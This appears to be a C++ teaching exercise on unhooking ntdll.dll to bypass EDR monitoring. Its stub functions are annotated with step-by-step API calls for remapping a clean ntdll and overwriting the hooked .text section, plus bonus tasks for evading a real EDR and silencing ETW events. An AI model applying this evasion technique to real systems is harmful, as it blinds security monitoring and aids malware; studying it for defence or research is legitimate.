/*
  Exercise 02 — NTDLL Unhooking
  -------------------------------
  EDRs hook ntdll.dll functions by patching the first few bytes of each
  function stub with a JMP to their own inspection code.

  Your job: restore the original (clean) bytes by mapping a fresh copy
  of ntdll.dll directly from disk and overwriting the hooked .text section.

  Tasks:
  1. Implement mapCleanNtdll() — map C:\Windows\System32\ntdll.dll using
     CreateFile + CreateFileMapping + MapViewOfFile (read-only).
  2. Implement findTextSection() — walk the PE section table to find
     the section named ".text" and return its VirtualAddress + SizeOfRawData.
  3. Implement unhookNtdll() — change protection on the in-memory .text
     section to RWX, copy clean bytes from the mapped file, restore Rx.
  4. Verify: call isHooked("NtAllocateVirtualMemory") before and after —
     the function should no longer start with E9 after unhooking.

  BONUS:
  - Instead of overwriting the whole section, only restore functions that
    are actually hooked (iterate exports, check each stub).
  - Handle ASLR: ntdll maps at a different base in each process, so you
    must apply the delta between in-memory base and on-disk ImageBase.
  - Test under a real EDR in a VM (observe ETW process events vanish).

  Compile (MSVC):
    cl /std:c++17 /W4 ex02_unhook_ntdll.cpp /link /OUT:ex02.exe
  Compile (GCC/MinGW):
    g++ -std=c++17 -Wall -o ex02.exe ex02_unhook_ntdll.cpp
*/

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

// ---------- helpers ----------

bool isHooked(const char* funcName) {
    PBYTE stub = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), funcName);
    if (!stub) return false;
    return (stub[0] == 0xE9 || stub[0] == 0xFF);  // JMP rel32 or JMP [rip+x]
}

// ---------- TODO 1: map clean ntdll from disk ----------
// Returns: base address of the mapped file, or nullptr on failure.
// Use: CreateFileA → CreateFileMappingA(PAGE_READONLY, SEC_IMAGE) → MapViewOfFile
// You'll use this mapped base to find the clean .text bytes.
PVOID mapCleanNtdll() {
    const char* path = "C:\\Windows\\System32\\ntdll.dll";

    // YOUR CODE HERE
    //   HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, ...);
    //   HANDLE hMap  = CreateFileMappingA(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    //   PVOID  base  = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    //   CloseHandle(hMap); CloseHandle(hFile);
    //   return base;

    (void)path;
    return nullptr; // replace
}

// ---------- TODO 2: find .text section ----------
struct SectionInfo { DWORD rva; DWORD size; };

SectionInfo findTextSection(PVOID moduleBase) {
    SectionInfo result = {};
    // YOUR CODE HERE
    // 1. Cast moduleBase to PBYTE
    // 2. Locate IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS64
    // 3. Walk IMAGE_SECTION_HEADER array (NumberOfSections)
    // 4. strcmp(section.Name, ".text") → store VirtualAddress and SizeOfRawData
    (void)moduleBase;
    return result;
}

// ---------- TODO 3: overwrite the hooked section ----------
bool unhookNtdll(PVOID cleanBase) {
    HMODULE inMemBase = GetModuleHandleA("ntdll.dll");
    if (!inMemBase || !cleanBase) return false;

    SectionInfo sec = findTextSection(cleanBase);
    if (!sec.rva || !sec.size) {
        printf("[-] Could not find .text section\n");
        return false;
    }

    PBYTE src = (PBYTE)cleanBase  + sec.rva;
    PBYTE dst = (PBYTE)inMemBase  + sec.rva;

    // YOUR CODE HERE
    // 1. VirtualProtect(dst, sec.size, PAGE_EXECUTE_READWRITE, &old)
    // 2. memcpy(dst, src, sec.size)
    // 3. VirtualProtect(dst, sec.size, old, &tmp)
    // 4. FlushInstructionCache(GetCurrentProcess(), dst, sec.size)

    (void)src; (void)dst;
    return false; // return true on success
}

// ---------- main ----------
int main() {
    const char* testFunc = "NtAllocateVirtualMemory";

    printf("[*] NtAllocateVirtualMemory hooked before unhook: %s\n",
           isHooked(testFunc) ? "YES" : "no");

    PVOID cleanNtdll = mapCleanNtdll();
    if (!cleanNtdll) {
        printf("[-] mapCleanNtdll() not implemented yet\n");
        return 1;
    }

    if (unhookNtdll(cleanNtdll)) {
        printf("[+] NTDLL unhooked\n");
        printf("[*] NtAllocateVirtualMemory hooked after  unhook: %s\n",
               isHooked(testFunc) ? "STILL HOOKED" : "no (clean)");
    } else {
        printf("[-] unhookNtdll() not implemented yet\n");
    }

    UnmapViewOfFile(cleanNtdll);
    return 0;
}
